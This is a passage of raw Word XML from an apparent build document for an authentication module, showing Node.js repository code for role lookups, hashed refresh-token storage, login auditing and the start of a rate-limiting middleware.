                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">       JOIN roles r             ON r.role_id       = ur.role_id</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">       JOIN role_permissions rp ON rp.role_id      = ur.role_id</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">       JOIN permissions p       ON p.permission_id = rp.permission_id</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      WHERE ur.user_id = ?`,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    [userId],</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if (rows.length === 0) return { role_code: null, permissions: [] };</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    role_code: rows[0].role_code,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    permissions: rows.map(r =&gt; r.permission_code),</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async function incrementFailedLogin(userId) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  await pool.query(</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    `UPDATE users SET failed_login_count = failed_login_count + 1, updated_at = NOW(6)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      WHERE user_id = ?`, [userId]);</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async function recordSuccessfulLogin(userId, ipAddress) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  await pool.query(</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    `UPDATE users</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        SET last_login_at = NOW(6), last_login_ip = ?,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">            failed_login_count = 0, updated_at = NOW(6)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      WHERE user_id = ?`, [ipAddress, userId]);</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module.exports = { findByEmployeeId, loadRoleAndPermissions,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">                   incrementFailedLogin, recordSuccessfulLogin };</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>4.5.2  refreshTokens.repo.js</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Stores sha256 hex of the JWT — never the raw token. If the DB is leaked, attackers hold a column of irreversible hashes; without the original signatures they cannot mint sessions.</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src/modules/auth/refreshTokens.repo.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>'use strict';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const pool = require('../../config/db');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const { sha256 } = require('../../utils/crypto');</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const REVOKE_REASONS = ['LOGOUT','ROTATED','ADMIN_REVOKE','PASSWORD_CHANGE','EXPIRY_CLEANUP'];</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async function persist({ userId, rawToken, expiresAt, userAgent, ipAddress }) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const tokenHash = sha256(rawToken);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  await pool.query(</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    `INSERT INTO refresh_tokens (user_id, token_hash, expires_at, user_agent, ip_address)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     VALUES (?, ?, ?, ?, ?)`,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    [userId, tokenHash, expiresAt, userAgent || null, ipAddress || null]);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return tokenHash;</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async function findValid(rawToken) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const tokenHash = sha256(rawToken);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const [rows] = await pool.query(</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    `SELECT token_id, user_id, expires_at</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">       FROM refresh_tokens</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      WHERE token_hash = ?</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        AND revoked_at IS NULL</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        AND expires_at &gt; NOW(6)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      LIMIT 1`, [tokenHash]);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return rows[0] || null;</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async function revoke(rawToken, reason) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!REVOKE_REASONS.includes(reason)) throw new Error('invalid reason');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const tokenHash = sha256(rawToken);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  await pool.query(</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    `UPDATE refresh_tokens</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        SET revoked_at = NOW(6), revoked_reason = ?</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      WHERE token_hash = ? AND revoked_at IS NULL`,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    [reason, tokenHash]);</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async function revokeAllForUser(userId, reason) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!REVOKE_REASONS.includes(reason)) throw new Error('invalid reason');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  await pool.query(</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    `UPDATE refresh_tokens</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        SET revoked_at = NOW(6), revoked_reason = ?</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      WHERE user_id = ? AND revoked_at IS NULL`,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    [reason, userId]);</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module.exports = { persist, findValid, revoke, revokeAllForUser, REVOKE_REASONS };</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>4.5.3  loginAudit.repo.js — Append-Only Writer</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Every login attempt (success or failure) and every refresh / logout writes a row. BR-AUTH-06 satisfied.</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src/modules/auth/loginAudit.repo.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>'use strict';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const pool = require('../../config/db');</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const OUTCOMES = [</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  'SUCCESS','FAILED_BAD_PASSWORD','FAILED_USER_LOCKED','FAILED_USER_INACTIVE',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  'FAILED_NOT_FOUND','FAILED_INVALID_FORMAT','LOGOUT','TOKEN_REFRESH',</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async function record({ employeeId, outcome, ipAddress, userAgent, notes }) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!OUTCOMES.includes(outcome)) throw new Error('invalid outcome');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  await pool.query(</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    `INSERT INTO login_audit (employee_id, outcome, ip_address, user_agent, notes)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">     VALUES (?, ?, ?, ?, ?)`,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    [employeeId, outcome, ipAddress || null, userAgent || null, notes || null]);</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module.exports = { record, OUTCOMES };</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>4.6  Pulled-Forward Middleware (STEP 4 stub)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>auth.routes.js references rateLimit.loginLimiter, rateLimit.refreshLimiter, and authenticate. The build doc explicitly authorises pulling these into STEP 3 as 'STEP 4 stub' so the routes can be wired end-to-end. STEP 4 then only adds the genuinely new authorize.js — the permission gate factory.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="200" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="25"/>
        </w:rPr>
        <w:t>4.6.1  rateLimit.js</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src/middleware/rateLimit.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>'use strict';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const rateLimit = require('express-rate-limit');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const env = require('../config/env');</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function rateLimitHandler(_req, res) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  res.status(429).json({ error: {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    code: 'RATE_LIMITED',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
